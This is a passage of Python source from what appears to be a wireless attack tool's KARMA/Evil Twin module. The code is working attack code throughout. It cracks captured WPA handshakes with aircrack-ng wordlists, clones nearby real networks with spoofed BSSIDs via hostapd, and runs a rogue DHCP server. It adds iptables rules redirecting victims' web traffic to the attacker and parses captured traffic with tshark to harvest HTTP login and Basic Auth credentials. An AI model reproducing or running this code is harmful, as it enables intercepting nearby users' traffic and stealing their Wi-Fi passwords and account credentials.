            if Configuration.verbose > 1:
                Color.pl('{!} {R}Error in handshake cracking worker: {O}%s{W}' % str(e))
            return False
    
    def try_password_async(self, handshake_file, password):
        """Try a specific password against handshake asynchronously"""
        try:
            cmd = ['aircrack-ng', '-w', '-', handshake_file]
            result = subprocess.run(cmd, input=password, capture_output=True, text=True, timeout=10)
            
            return 'KEY FOUND!' in result.stdout
            
        except subprocess.TimeoutExpired:
            return False
        except Exception:
            return False
    
    def try_wordlist_attack_async(self, handshake_file, wordlist_file):
        """Try wordlist attack against handshake asynchronously"""
        try:
            cmd = ['aircrack-ng', '-w', wordlist_file, handshake_file]
            result = subprocess.run(cmd, capture_output=True, text=True, timeout=30)
            
            if 'KEY FOUND!' in result.stdout:
                # Extract password from output
                lines = result.stdout.split('\n')
                for line in lines:
                    if 'KEY FOUND!' in line:
                        parts = line.split()
                        if len(parts) > 2:
                            password = parts[-1]
                            return password
            return False
            
        except subprocess.TimeoutExpired:
            return False
        except Exception:
            return False
    
    def cleanup_completed_capture_threads(self):
        """Clean up completed capture threads - Thread-safe implementation"""
        try:
            with self._capture_lock:
                completed_clients = []
                for client_mac, thread_info in self.active_capture_threads.items():
                    if thread_info['status'] == 'completed' or not thread_info['thread'].is_alive():
                        completed_clients.append(client_mac)
                
                for client_mac in completed_clients:
                    del self.active_capture_threads[client_mac]
                    
        except Exception as e:
            if Configuration.verbose > 1:
                Color.pl('{!} {R}Error cleaning up capture threads: {O}%s{W}' % str(e))
    
    def cleanup_all_capture_threads(self):
        """Clean up all active capture threads - Thread-safe implementation"""
        try:
            with self._capture_lock:
                threads_to_cleanup = list(self.active_capture_threads.items())
                self.active_capture_threads.clear()
            
            # Clean up threads outside of lock to avoid deadlock
            for client_mac, thread_info in threads_to_cleanup:
                try:
                    if thread_info['thread'].is_alive():
                        # Thread is still running, wait briefly for completion
                        thread_info['thread'].join(timeout=2)
                except Exception:
                    pass
                    
        except Exception as e:
            if Configuration.verbose > 1:
                Color.pl('{!} {R}Error cleaning up all capture threads: {O}%s{W}' % str(e))
    
    def crack_handshake(self, client_mac, handshake_file):
        """Legacy method - redirects to async implementation"""
        self.crack_handshake_async(client_mac, handshake_file)
    
    def try_password(self, handshake_file, password):
        """Legacy method - redirects to async implementation"""
        return self.try_password_async(handshake_file, password)
    
    def try_wordlist_attack(self, handshake_file, wordlist_file):
        """Legacy method - redirects to async implementation"""
        return self.try_wordlist_attack_async(handshake_file, wordlist_file)
    
    def add_rogue_ap_network(self, bssid, essid, clients=None):
        """Add a rogue AP network to tracking"""
        try:
            network_info = {
                'bssid': bssid,
                'essid': essid,
                'clients': clients or [],
                'created_time': time.time()
            }
            
            # Check if network already exists
            for i, existing_network in enumerate(self.rogue_ap_networks):
                if existing_network['bssid'] == bssid:
                    # Update existing network
                    self.rogue_ap_networks[i] = network_info
                    return
            
            # Add new network
            self.rogue_ap_networks.append(network_info)
            Color.pl('{+} {C}Added rogue AP network: {G}%s{W} ({C}%s{W})' % (essid, bssid))
            
        except Exception as e:
            if Configuration.verbose > 1:
                Color.pl('{!} {R}Error adding rogue AP network: {O}%s{W}' % str(e))
    
    def update_rogue_ap_clients(self, bssid, clients):
        """Update clients for a rogue AP network"""
        try:
            for network in self.rogue_ap_networks:
                if network['bssid'] == bssid:
                    network['clients'] = clients
                    return True
            return False
            
        except Exception as e:
            if Configuration.verbose > 1:
                Color.pl('{!} {R}Error updating rogue AP clients: {O}%s{W}' % str(e))
            return False
    
    def monitor_credential_harvesting(self):
        try:
            while self.running:
                if self.connected_clients:
                    for client_mac in self.connected_clients:
                        if client_mac not in self.harvested_credentials:
                            self.harvest_credentials_from_client(client_mac)
                
                time.sleep(5)
                
        except Exception as e:
            if Configuration.verbose > 1:
                Color.pl('{!} {R}Error in credential harvesting: {O}%s{W}' % str(e))
    
    def harvest_credentials_from_client(self, client_mac):
        """Harvest credentials from a specific client's traffic"""
        try:
            Color.pl('{+} {C}Harvesting credentials from {G}%s{W}...' % client_mac)
            
            # Capture traffic from this client
            with Airodump(interface=self.probe_interface,
                         target_bssid=client_mac,
                         output_file_prefix='karma_credentials_%s' % client_mac.replace(':', ''),
                         delete_existing_files=True) as airodump:
                
                # Monitor for 30 seconds
                timer = Timer(30)
                credentials_found = []
                
                while not timer.ended() and self.running:
                    cap_files = airodump.find_files(endswith='.cap')
                    if cap_files:
                        # Analyze captured traffic for credentials
                        credentials = self.analyze_traffic_for_credentials(cap_files[0])
                        if credentials:
                            credentials_found.extend(credentials)
                    
                    time.sleep(5)
                
                if credentials_found:
                    self.harvested_credentials[client_mac] = credentials_found
                    Color.pl('{+} {G}Credentials harvested from {C}%s{W}:{W}' % client_mac)
                    for cred in credentials_found:
                        Color.pl('  {G}* {W}%s{W}' % cred)
                        
                    if hasattr(self, 'target') and self.target:
                        Color.pattack('KARMA', self.target, 'Credentials Harvested', f'{client_mac}: {len(credentials_found)} credentials')
                
        except Exception as e:
            if Configuration.verbose > 1:
                Color.pl('{!} {R}Error harvesting credentials: {O}%s{W}' % str(e))
    
    def analyze_traffic_for_credentials(self, capfile):
        """Analyze captured traffic for login credentials"""
        try:
            credentials = []
            
            # Look for HTTP POST requests (login forms)
            http_cmd = [
                'tshark',
                '-r', capfile,
                '-Y', 'http.request.method == POST',
                '-T', 'fields',
                '-e', 'http.host',
                '-e', 'http.request.uri',
                '-e', 'http.file_data'
            ]
            
            result = subprocess.run(http_cmd, capture_output=True, text=True)
            if result.returncode == 0 and result.stdout.strip():
                lines = result.stdout.split('\n')
                for line in lines:
                    if line.strip():
                        parts = line.split('\t')
                        if len(parts) >= 3:
                            host = parts[0]
                            uri = parts[1]
                            data = parts[2] if len(parts) > 2 else ''
                            
                            # Look for common login form fields
                            if any(field in data.lower() for field in ['password', 'passwd', 'pwd', 'login', 'username', 'user']):
                                cred_info = f"Login attempt: {host}{uri}"
                                if 'username' in data.lower() or 'user' in data.lower():
                                    cred_info += " (Username found)"
                                if 'password' in data.lower() or 'passwd' in data.lower():
                                    cred_info += " (Password found)"
                                
                                credentials.append(cred_info)
            
            # Look for HTTP Basic Auth
            basic_auth_cmd = [
                'tshark',
                '-r', capfile,
                '-Y', 'http.authorization',
                '-T', 'fields',
                '-e', 'http.host',
                '-e', 'http.authorization'
            ]
            
            result = subprocess.run(basic_auth_cmd, capture_output=True, text=True)
            if result.returncode == 0 and result.stdout.strip():
                lines = result.stdout.split('\n')
                for line in lines:
                    if line.strip() and 'Basic' in line:
                        credentials.append(f"HTTP Basic Auth: {line}")
            
            return credentials
            
        except Exception as e:
            if Configuration.verbose > 1:
                Color.pl('{!} {R}Error analyzing traffic: {O}%s{W}' % str(e))
            return []
    
    
    def show_attack_status(self):
        """Show comprehensive attack status"""
        try:
            if self.connected_clients or self.captured_handshakes or self.cracked_passwords or self.harvested_credentials:
                Color.clear_entire_line()
                
                status_parts = []
                if self.connected_clients:
                    status_parts.append(f"{len(self.connected_clients)} clients connected")
                if self.captured_handshakes:
                    status_parts.append(f"{len(self.captured_handshakes)} handshakes captured")
                if self.cracked_passwords:
                    status_parts.append(f"{len(self.cracked_passwords)} passwords cracked")
                if self.harvested_credentials:
                    status_parts.append(f"{len(self.harvested_credentials)} credentials harvested")
                
                status = " | ".join(status_parts)
                Color.p('{+} {G}Enhanced KARMA Active - {C}%s{W}' % status)
                
                # GUI logging
                if hasattr(self, 'target') and self.target:
                    Color.pattack('KARMA', self.target, 'Status', status)
                
        except Exception as e:
            if Configuration.verbose > 1:
                Color.pl('{!} {R}Error showing status: {O}%s{W}' % str(e))
    
    def decode_hex_ssid(self, ssid):
        """Convert hex-encoded SSID to readable text"""
        try:
            # Check if SSID is hex-encoded (contains only hex characters)
            if len(ssid) > 0 and all(c in '0123456789abcdefABCDEF' for c in ssid):
                # Try to decode as hex
                try:
                    decoded = bytes.fromhex(ssid).decode('utf-8', errors='ignore')
                    if decoded and decoded.isprintable():
                        return decoded
                except:
                    pass
            
            # Return original SSID if not hex or decoding failed
            return ssid
            
        except Exception:
            return ssid
    
    def setup_rogue_ap(self):
        """Setup rogue access point infrastructure"""
        Color.pl('\n{+} {C}Phase 2: Setting up rogue AP infrastructure{W}')
        
        try:
            # Create hostapd configuration
            if hasattr(self, 'target') and self.target:
                Color.pattack('KARMA', self.target, 'Rogue AP Setup', 'Creating hostapd config')
            if not self.create_hostapd_config():
                return False
            
            # Setup DHCP server (dnsmasq) - only if DNS spoofing is enabled
            dns_spoofing_enabled = getattr(Configuration, 'karma_dns_spoofing', False)  # Changed default from True to False
            self.dns_spoofing_enabled = dns_spoofing_enabled  # Store for cleanup
            
            # Debug: Log current Configuration values
            Color.pl('{+} {C}KARMA Configuration Debug:{W}')
            Color.pl('{+} {C}  karma_dns_spoofing: {G}%s{W}' % getattr(Configuration, 'karma_dns_spoofing', 'NOT SET'))
            Color.pl('{+} {C}  karma_probe_timeout: {G}%s{W}' % getattr(Configuration, 'karma_probe_timeout', 'NOT SET'))
            Color.pl('{+} {C}  karma_min_probes: {G}%s{W}' % getattr(Configuration, 'karma_min_probes', 'NOT SET'))
            Color.pl('{+} {C}  karma_capture_all_channels: {G}%s{W}' % getattr(Configuration, 'karma_capture_all_channels', 'NOT SET'))
            
            if dns_spoofing_enabled:
                if hasattr(self, 'target') and self.target:
                    Color.pattack('KARMA', self.target, 'Rogue AP Setup', 'Setting up DHCP server')
                if not self.setup_dhcp_server():
                    return False
                
                # Setup DNS redirection
                if hasattr(self, 'target') and self.target:
                    Color.pattack('KARMA', self.target, 'Rogue AP Setup', 'Setting up DNS redirection')
                if not self.setup_dns_redirection():
                    return False
            else:
                Color.pl('{+} {O}DNS spoofing disabled - running Layer 2 KARMA only{W}')
                if hasattr(self, 'target') and self.target:
                    Color.pattack('KARMA', self.target, 'Rogue AP Setup', 'DNS spoofing disabled - Layer 2 only')
            
            # Reset rogue interface for AP mode (only if single interface mode)
            if self.single_interface_mode:
                if hasattr(self, 'target') and self.target:
                    Color.pattack('KARMA', self.target, 'Rogue AP Setup', 'Resetting interface for AP mode')
                if not self.switch_interface_mode('master', 'Rogue AP Setup'):
                    Color.pl('{!} {R}Failed to reset rogue interface for AP mode{W}')
                    return False
            else:
                # Dual interface mode: Ensure rogue interface is in master mode for AP
                Color.pl('{+} {C}Ensuring rogue interface {G}%s{W} is in master mode for AP...{W}' % self.rogue_interface)
                if not self.switch_interface_mode('master', 'Rogue AP Setup'):
                    Color.pl('{!} {R}Failed to switch rogue interface to master mode{W}')
                    return False
            
            # Start rogue AP
            if hasattr(self, 'target') and self.target:
                Color.pattack('KARMA', self.target, 'Rogue AP Setup', 'Starting rogue AP')
            if not self.start_rogue_ap():
                return False
            
            Color.pl('{+} {G}Rogue AP infrastructure setup complete{W}')
            if hasattr(self, 'target') and self.target:
                Color.pattack('KARMA', self.target, 'Rogue AP Setup', 'Complete')
            return True
            
        except Exception as e:
            Color.pl('{!} {R}Failed to setup rogue AP: {O}%s{W}' % str(e))
            return False
    
    def create_hostapd_config(self):
        """Create hostapd configuration file for exact network clones"""
        try:
            # Find the best real network to clone (one that users likely have saved)
            target_network = self.find_best_network_to_clone()
            
            if not target_network:
                error_msg = 'No suitable networks found to clone'
                Color.pl('{!} {R}%s{W}' % error_msg)
                Color.pl('{!} {O}This usually means no networks with clients were found during scanning{W}')
                Color.pl('{!} {O}Try running a longer scan or ensure you are in an area with active networks{W}')
                
                # Also log to GUI
                if hasattr(self, 'target') and self.target:
                    Color.pattack('KARMA', self.target, 'Rogue AP Setup', 'Failed - ' + error_msg)
                return False
            
            target_ssid = target_network.essid
            target_bssid = target_network.bssid
            target_channel = target_network.channel
            
            # Check if this is the user's selected target
            user_target = getattr(self, 'target', None)
            is_user_target = user_target and user_target.essid == target_ssid
            
            if is_user_target:
                Color.pl('{+} {G}Creating Evil Twin for user-selected target: {C}%s{W} (Channel {C}%s{W})' % (target_ssid, target_channel))
            else:
                Color.pl('{+} {G}Creating Evil Twin for: {C}%s{W} (Channel {C}%s{W})' % (target_ssid, target_channel))
            
            # Ensure SSID is not too long (max 32 characters)
            if len(target_ssid) > 32:
                target_ssid = target_ssid[:32]
            
            # Create multiple hostapd configs for different networks
            self.hostapd_configs = []
            
            # Create config for the primary target network
            primary_config = self.create_single_hostapd_config(target_ssid, target_channel, target_bssid)
            if primary_config:
                self.hostapd_configs.append(primary_config)
                Color.pl('{+} {G}Created Evil Twin for: {C}%s{W} (Channel {C}%s{W})' % (target_ssid, target_channel))
            
            # Create additional configs for other popular networks
            for ssid in list(self.pnl_networks)[:3]:  # Limit to 3 additional networks
                if ssid != target_ssid and ssid != '<MISSING>' and ssid.strip():
                    additional_config = self.create_single_hostapd_config(ssid, target_channel, None)
                    if additional_config:
                        self.hostapd_configs.append(additional_config)
                        Color.pl('{+} {G}Created additional Evil Twin: {C}%s{W}' % ssid)
            
            if self.hostapd_configs:
                self.hostapd_config = self.hostapd_configs[0]  # Primary config
                Color.pl('{+} {G}Created {C}%d{W} Evil Twin configurations{W}' % len(self.hostapd_configs))
                return True
            else:
                return False
            
        except Exception as e:
            Color.pl('{!} {R}Failed to create hostapd configs: {O}%s{W}' % str(e))
            return False
    
    def find_best_network_to_clone(self):
        """Find the best real network to clone based on client activity, popularity, and user selection"""
        try:
            best_network = None
            max_score = 0
            
            # First, check if user selected a specific target
            user_target = getattr(self, 'target', None)
            if user_target and user_target.essid:
                Color.pl('{+} {C}Looking for user-selected target: {G}%s{W}' % user_target.essid)
                
                # Look for the user's selected network first
                for network in self.real_networks:
                    if network.essid == user_target.essid:
                        Color.pl('{+} {G}Found user-selected target: {C}%s{W} - prioritizing this network{W}' % network.essid)
                        Color.pl('{+} {G}Target network has {C}%d{W} clients{W}' % len(network.clients))
                        
                        # Show clients for the selected target
                        if network.clients:
                            Color.pl('{+} {C}Clients on selected target:{W}')
                            for client in network.clients:
                                Color.pl('  {G}* {W}Client: {C}%s{W}' % client.bssid)
                        else:
                            Color.pl('{!} {O}Warning: Selected target has no detected clients{W}')
                            Color.pl('{!} {O}This may reduce attack effectiveness{W}')
                        
                        return network
                
                Color.pl('{!} {O}User-selected target {G}%s{O} not found in scanned networks{W}' % user_target.essid)
                Color.pl('{!} {O}Falling back to automatic network selection{W}')
            
            # If user target not found or not specified, use original logic
            Color.pl('{+} {C}Selecting best network automatically based on client activity and popularity{W}')
            
            for network in self.real_networks:
                if not network.essid_known or not network.essid:
                    continue
                
                # Calculate score based on:
                # 1. Number of clients (more clients = higher chance of saved passwords)
                # 2. Network popularity (common names)
                # 3. Signal strength (closer networks)
                
                score = len(network.clients) * 10  # Base score from client count
                
                # Bonus for common network names
                common_names = ['home', 'wifi', 'internet', 'router', 'network', 'linksys', 'netgear', 'tp-link']
                essid_lower = network.essid.lower()
                for common in common_names:
                    if common in essid_lower:
                        score += 5
                        break
                
                # Bonus for strong signal (closer to 0 is better)
                try:
                    power = int(network.power)
                    if power > -50:  # Very strong signal
                        score += 3
                    elif power > -70:  # Good signal
                        score += 1
                except:
                    pass
                
                if score > max_score:
                    max_score = score
                    best_network = network
            
            if best_network:
                Color.pl('{+} {C}Selected best network to clone: {G}%s{W} (Score: {C}%d{W})' % 
                        (best_network.essid, max_score))
                Color.pl('{+} {G}Selected network has {C}%d{W} clients{W}' % len(best_network.clients))
            
            return best_network
            
        except Exception as e:
            if Configuration.verbose > 1:
                Color.pl('{!} {R}Error finding best network: {O}%s{W}' % str(e))
            return None
    
    def create_single_hostapd_config(self, ssid, channel, spoof_bssid=None):
        """Create a single hostapd configuration file"""
        try:
            # Ensure SSID is not too long
            if len(ssid) > 32:
                ssid = ssid[:32]
            
            config_content = f"""interface={self.rogue_interface}
driver=nl80211
ssid={ssid}
hw_mode=g
channel={channel}
wmm_enabled=1
macaddr_acl=0
auth_algs=1
ignore_broadcast_ssid=0
country_code=US
ieee80211n=1
ieee80211ac=1
ht_capab=[HT40+][HT40-][SHORT-GI-20][SHORT-GI-40]
vht_capab=[VHT40][VHT80][VHT160][SHORT-GI-80][SHORT-GI-160]
"""
            
            # Add BSSID spoofing if specified
            if spoof_bssid:
                config_content += f"bssid={spoof_bssid}\n"
            
            config_file = Configuration.temp('hostapd_karma_%s.conf' % ssid.replace(' ', '_'))
            with open(config_file, 'w') as f:
                f.write(config_content)
            
            return config_file
            
        except Exception as e:
            if Configuration.verbose > 1:
                Color.pl('{!} {R}Failed to create config for {G}%s{W}: {O}%s{W}' % (ssid, str(e)))
            return None
    
    def setup_dhcp_server(self):
        """Setup DHCP server using dnsmasq"""
        try:
            # Check if dnsmasq is available before creating config
            try:
                result = subprocess.run(['dnsmasq', '--version'], capture_output=True, text=True, timeout=5)
                if result.returncode != 0:
                    error_msg = 'dnsmasq not available for DHCP setup'
                    Color.pl('{!} {R}%s{W}' % error_msg)
                    Color.pl('{!} {O}Install with: sudo apt install dnsmasq{W}')
                    
                    # Also log to GUI
                    if hasattr(self, 'target') and self.target:
                        Color.pattack('KARMA', self.target, 'DHCP Setup', 'Failed - ' + error_msg)
                    return False
            except:
                error_msg = 'dnsmasq not available for DHCP setup'
                Color.pl('{!} {R}%s{W}' % error_msg)
                Color.pl('{!} {O}Install with: sudo apt install dnsmasq{W}')
                
                # Also log to GUI
                if hasattr(self, 'target') and self.target:
                    Color.pattack('KARMA', self.target, 'DHCP Setup', 'Failed - ' + error_msg)
                return False
            
            # Create dnsmasq configuration (bind to interface and avoid host/system resolvers)
            leases_path = Configuration.temp('dnsmasq.leases')
            log_path = Configuration.temp('dnsmasq.log')
            config_content = f"""interface={self.rogue_interface}
bind-interfaces
except-interface=lo
no-resolv
no-hosts
dhcp-range=10.0.0.10,10.0.0.250,12h
dhcp-option=3,10.0.0.1
dhcp-option=6,10.0.0.1
dhcp-leasefile={leases_path}
log-queries
log-dhcp
log-facility={log_path}
server=8.8.8.8
"""
            
            config_file = Configuration.temp('dnsmasq_karma.conf')
            with open(config_file, 'w') as f:
                f.write(config_content)
            
            self.dnsmasq_config = config_file
            Color.pl('{+} {G}Created dnsmasq configuration{W}')
            return True
            
        except Exception as e:
            error_msg = 'Failed to setup DHCP server: ' + str(e)
            Color.pl('{!} {R}%s{W}' % error_msg)
            
            # Also log to GUI
            if hasattr(self, 'target') and self.target:
                Color.pattack('KARMA', self.target, 'DHCP Setup', 'Failed - ' + error_msg)
            return False
    
    def setup_dns_redirection(self):
        """Setup DNS redirection using iptables"""
        try:
            # Check for potential conflicts with resolvconf/systemd-resolved
            try:
                # Check for resolvconf
                result = subprocess.run(['which', 'resolvconf'], capture_output=True, text=True)
                if result.returncode == 0:
                    Color.pl('{!} {O}Warning: resolvconf detected - may cause DNS conflicts with dnsmasq{W}')
                    Color.pl('{!} {O}If DNS issues occur, stop systemd-resolved: sudo systemctl stop systemd-resolved{W}')
                
                # Check for systemd-resolved
                result = subprocess.run(['systemctl', 'is-active', 'systemd-resolved'], capture_output=True, text=True)
                if result.returncode == 0 and 'active' in result.stdout:
                    Color.pl('{!} {O}Warning: systemd-resolved is active - stopping to prevent conflicts{W}')
                    try:
                        subprocess.run(['systemctl', 'stop', 'systemd-resolved'], check=True, timeout=10)
                        Color.pl('{+} {G}Stopped systemd-resolved{W}')
                    except subprocess.CalledProcessError:
                        Color.pl('{!} {R}Failed to stop systemd-resolved - port 53 may be in use{W}')
                    except subprocess.TimeoutExpired:
                        Color.pl('{!} {R}Timeout stopping systemd-resolved{W}')
            except:
                pass
            
            # Setup iptables rules for traffic redirection
            commands = [
                f'ifconfig {self.rogue_interface} 10.0.0.1/24 up',
                'echo "1" > /proc/sys/net/ipv4/ip_forward',
                f'iptables -t nat -A PREROUTING -i {self.rogue_interface} -p tcp --dport 80 -j DNAT --to-destination 10.0.0.1:80',
                f'iptables -t nat -A PREROUTING -i {self.rogue_interface} -p tcp --dport 443 -j DNAT --to-destination 10.0.0.1:80',
                f'iptables -A FORWARD -i {self.rogue_interface} -j ACCEPT'
            ]
            
            failed_commands = []
            for cmd in commands:
                result = subprocess.run(cmd, shell=True, capture_output=True, text=True)
                if result.returncode != 0:
                    Color.pl('{!} {R}Warning: Command failed: {O}%s{W}' % cmd)
                    if result.stderr:
                        Color.pl('{!} {O}Error: {R}%s{W}' % result.stderr.strip())
                    failed_commands.append(cmd)
            
            if failed_commands:
                error_msg = f'DNS redirection partially failed - {len(failed_commands)} commands failed'
                Color.pl('{!} {R}%s{W}' % error_msg)
                
                # Also log to GUI
                if hasattr(self, 'target') and self.target:
                    Color.pattack('KARMA', self.target, 'DNS Redirection', 'Warning - ' + error_msg)
            else:
                Color.pl('{+} {G}DNS redirection setup complete{W}')
            
            return True
            
        except Exception as e:
            error_msg = 'Failed to setup DNS redirection: ' + str(e)
            Color.pl('{!} {R}%s{W}' % error_msg)
            
            # Also log to GUI
            if hasattr(self, 'target') and self.target:
                Color.pattack('KARMA', self.target, 'DNS Redirection', 'Failed - ' + error_msg)
            return False
    
    def free_port_53(self):
        """Preflight: stop services that may hold port 53 and ensure AP iface is up."""
        try:
            # Stop system resolvers and dnsmasq/bind if running
            try:
                subprocess.run(['systemctl', 'stop', 'systemd-resolved'], capture_output=True, timeout=5)
            except Exception:
                pass
            for pname in ['dnsmasq', 'named', 'bind9']:
                try:
                    subprocess.run(['pkill', '-f', pname], capture_output=True, timeout=3)
                except Exception:
                    pass
            # Ensure AP interface is up before binding
            try:
                iface = getattr(self, 'rogue_interface', None)
                if iface:
                    subprocess.run(['ip', 'link', 'set', str(iface), 'up'], capture_output=True, timeout=3)
            except Exception:
                pass
            # Verify with ss; return True if free
            try:
                ss_out = subprocess.run(['ss', '-lntup'], capture_output=True, text=True, timeout=3)
                if ss_out.returncode == 0 and ':53 ' in ss_out.stdout:
                    return False
            except Exception:
                # If ss unavailable, best-effort
                pass
            return True
        except Exception:
            return False

    def start_rogue_ap(self):
        """Start multiple Evil Twin access points"""
        try:
            # Check if hostapd config exists
            if not self.hostapd_config:
                Color.pl('{!} {R}No hostapd configuration found - cannot start Evil Twin{W}')
                return False
            
            # Check if hostapd is available with better error handling
            hostapd_available = self.check_hostapd_availability()
            if not hostapd_available:
                return False
            
            # Check if dnsmasq is available
            dnsmasq_available = self.check_dnsmasq_availability()
            if not dnsmasq_available:
                return False
            
            # Start primary Evil Twin
            if self.hostapd_config:
                # Interface should already be in master mode from setup_rogue_ap
                # Additional interface preparation for hostapd
                if not self.final_interface_preparation():
                    Color.pl('{!} {R}Final interface preparation failed{W}')
                    return False
                
                hostapd_cmd = ['hostapd', '-B', self.hostapd_config]  # -B for background
                Color.pl('{+} {C}Starting hostapd with config: {G}%s{W}' % self.hostapd_config)
                
                # Capture stderr for debugging
                self.rogue_ap_process = subprocess.Popen(hostapd_cmd, stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True)
                
                # Give it time to start
                time.sleep(5)  # Increased timeout
                
                # Check if hostapd started successfully
                # hostapd with -B flag runs in background, so we check if it's still running
                if self.rogue_ap_process.poll() is None:
                    # Process is still running in background - success!
                    Color.pl('{+} {G}Primary Evil Twin started successfully{W}')
                    Color.pl('{+} {G}AP is enabled and ready for connections{W}')
                    
                    # Verify AP is actually working by checking interface status
                    try:
                        if self.rogue_interface:
                            result = subprocess.run(['iwconfig', self.rogue_interface], capture_output=True, text=True, timeout=3)
                            if result.returncode == 0 and 'Mode:Master' in result.stdout:
                                Color.pl('{+} {G}Interface confirmed in Master mode - AP is active{W}')
                            else:
                                Color.pl('{!} {O}Warning: Interface may not be in Master mode{W}')
                        else:
                            Color.pl('{!} {O}Warning: No rogue interface available for verification{W}')
                    except Exception as e:
                        if Configuration.verbose > 1:
                            Color.pl('{!} {O}Could not verify interface mode: {O}%s{W}' % str(e))
                else:
                    # Process exited, get error output
                    stdout, stderr = self.rogue_ap_process.communicate()
                    error_msg = 'Failed to start primary Evil Twin'
                    Color.pl('{!} {R}%s{W}' % error_msg)
                    if stderr:
                        Color.pl('{!} {O}hostapd error: {R}%s{W}' % stderr.strip())
                        error_msg += ': ' + stderr.strip()
                    if stdout:
                        Color.pl('{!} {O}hostapd output: {R}%s{W}' % stdout.strip())
                        
                        # Provide comprehensive troubleshooting
                        self.provide_hostapd_troubleshooting()
                        
                        # Also log to GUI
                        if hasattr(self, 'target') and self.target:
                            Color.pattack('KARMA', self.target, 'Rogue AP Setup', 'Failed - ' + error_msg)
                        return False
                    else:
                        # Process exited normally, verify AP is actually running
                        if self.verify_ap_running():
                            Color.pl('{+} {G}Primary Evil Twin started successfully{W}')
                            Color.pl('{+} {G}AP is enabled and ready for connections{W}')
                        else:
                            Color.pl('{!} {R}AP may not be running properly{W}')
                            Color.pl('{!} {O}Continuing anyway - AP may still work{W}')
            
            # Start additional Evil Twins if we have multiple configs
            if hasattr(self, 'hostapd_configs') and len(self.hostapd_configs) > 1:
                self.start_additional_evil_twins()
            
            
            # Start dnsmasq for DHCP (only if DNS spoofing is enabled)
            if self.dns_spoofing_enabled and hasattr(self, 'dnsmasq_config') and self.dnsmasq_config:
                # Strict preflight: free port 53 and ensure AP iface is up
                if not self.free_port_53():
                    Color.pl('{!} {R}Port 53 is busy; could not free DNS port automatically{W}')
                    Color.pl('{!} {O}Stop system resolvers and dns services, then retry:{W}')
                    Color.pl('{!}   sudo systemctl stop systemd-resolved && sudo pkill -f dnsmasq{W}')
                    return False

                dnsmasq_cmd = ['dnsmasq', '-C', self.dnsmasq_config]
                Color.pl('{+} {C}Starting dnsmasq with config: {G}%s{W}' % self.dnsmasq_config)
                
                # Capture stderr for debugging
                self.dhcp_process = subprocess.Popen(dnsmasq_cmd, stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True)
                
                # Give processes time to start
                time.sleep(3)
                
                # Check if dnsmasq started successfully
                if self.dhcp_process.poll() is None:
                    Color.pl('{+} {G}Evil Twin infrastructure started successfully{W}')
                    return True
                else:
                    # Get error output
                    stdout, stderr = self.dhcp_process.communicate()
                    error_msg = 'Failed to start dnsmasq'
                    Color.pl('{!} {R}%s{W}' % error_msg)
                    if stderr:
                        Color.pl('{!} {O}dnsmasq error: {R}%s{W}' % stderr.strip())
                        error_msg += ': ' + stderr.strip()
                    if stdout:
                        Color.pl('{!} {O}dnsmasq output: {R}%s{W}' % stdout.strip())

                    # Provide actionable hints for common causes
                    Color.pl('{!} {O}If error mentions port 53 in use, stop systemd-resolved:{W}')
                    Color.pl('{!} {O}  sudo systemctl stop systemd-resolved{W}')
                    Color.pl('{!} {O}Also ensure no other dnsmasq instance is running:{W}')
                    Color.pl('{!} {O}  sudo pkill -f dnsmasq{W}')
                    
                    # Also log to GUI
                    if hasattr(self, 'target') and self.target:
                        Color.pattack('KARMA', self.target, 'Rogue AP Setup', 'Failed - ' + error_msg)
                    return False
            else:
                Color.pl('{+} {G}Evil Twin infrastructure started successfully (DNS spoofing disabled){W}')
                return True
            
        except Exception as e:
            error_msg = 'Failed to start Evil Twin infrastructure: ' + str(e)
            Color.pl('{!} {R}%s{W}' % error_msg)
            
            # Also log to GUI
            if hasattr(self, 'target') and self.target:
                Color.pattack('KARMA', self.target, 'Rogue AP Setup', 'Failed - ' + error_msg)
            return False
    
    def start_additional_evil_twins(self):
        """Start additional Evil Twin access points on multiple interfaces"""
        try:
            if not self.additional_interfaces:
                Color.pl('{!} {O}No additional interfaces available for multiple APs{W}')
                return
            
            self.additional_processes = []
            
            Color.pl('{+} {C}Starting additional Evil Twin APs on multiple interfaces...{W}')
            
            for i, interface in enumerate(self.additional_interfaces[:3], 1):  # Limit to 3 additional APs
                try:
                    # Create config for this interface
                    config_file = self.create_interface_specific_config(self.hostapd_config, interface)
                    
                    if config_file:
                        # Modify SSID to be unique for this interface
                        modified_config = self.create_unique_ssid_config(config_file, interface, i)
                        
                        if modified_config:
                            cmd = ['hostapd', '-B', modified_config]
                            Color.pl('{+} {C}Starting Evil Twin {C}%d{W} on interface {G}%s{W}...' % (i, interface))
                            
                            process = subprocess.Popen(cmd, stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True)
                            
                            time.sleep(2)  # Give it time to start
                            
                            if process.poll() is None:
                                self.additional_processes.append(process)
                                Color.pl('{+} {G}Evil Twin {C}%d{W} started successfully on {G}%s{W}' % (i, interface))
                                
                                # GUI logging
                                if hasattr(self, 'target') and self.target:
                                    Color.pattack('KARMA', self.target, 'Multi-AP', f'Started AP {i} on {interface}')
                            else:
                                stdout, stderr = process.communicate()
                                Color.pl('{!} {R}Failed to start Evil Twin {C}%d{W} on {G}%s{W}' % (i, interface))
                                if stderr:
                                    Color.pl('{!} {O}Error: {R}%s{W}' % stderr.strip()[:100])
                        
                except Exception as e:
                    Color.pl('{!} {R}Error starting Evil Twin {C}%d{W}: {O}%s{W}' % (i, str(e)))
            
            if self.additional_processes:
                Color.pl('{+} {G}Successfully started {C}%d{W} additional Evil Twin APs{W}' % len(self.additional_processes))
                Color.pl('{+} {C}Total Evil Twin APs running: {G}%d{W}' % (len(self.additional_processes) + 1))
            else:
                Color.pl('{!} {O}No additional Evil Twin APs could be started{W}')
            
        except Exception as e:
            Color.pl('{!} {R}Error starting additional Evil Twins: {O}%s{W}' % str(e))
    
    def create_unique_ssid_config(self, config_file, interface, ap_number):
        """Create a config with unique SSID for additional AP"""
        try:
            # Read original config
            with open(config_file, 'r') as f:
                content = f.read()
            
            # Extract original SSID
            ssid_match = re.search(r'ssid=(.+)', content)
            if ssid_match:
                original_ssid = ssid_match.group(1).strip()
                # Create unique SSID by appending AP number
                unique_ssid = f"{original_ssid}_AP{ap_number}"
                
                # Replace SSID in config
                modified_content = content.replace(f'ssid={original_ssid}', f'ssid={unique_ssid}')
                
                # Create new config file
                new_config = config_file.replace('.conf', f'_unique_{interface}.conf')
                with open(new_config, 'w') as f:
                    f.write(modified_content)
                
